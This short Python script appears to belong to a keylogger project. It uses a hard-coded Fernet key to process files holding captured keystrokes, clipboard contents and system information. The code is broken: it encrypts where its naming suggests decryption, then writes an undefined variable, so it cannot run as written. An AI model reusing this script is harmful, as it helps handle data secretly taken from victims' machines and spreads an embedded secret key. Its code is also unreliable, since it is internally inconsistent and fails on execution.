from cryptography.fernet import Fernet

key = "9g6jNwikn0mUo16UTu3_YmylqpUz-yg766znAs416GQ=" #Encryption Key

keys_info_e = "e_key_log.txt"

system_info_e ="e_system_info.txt"

clipboard_info_e ="e_clipboard.txt"

encrypted_files = [system_info_e,clipboard_info_e,keys_info_e]
count = 0

for decrypting_file in encrypted_files:
    with open(encrypted_files[count],'rb') as f:
        data = f.read()
    
    fernet = Fernet (key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_files[count],'wb') as f:
        f.write(decrypted) 
    
    count +=1
    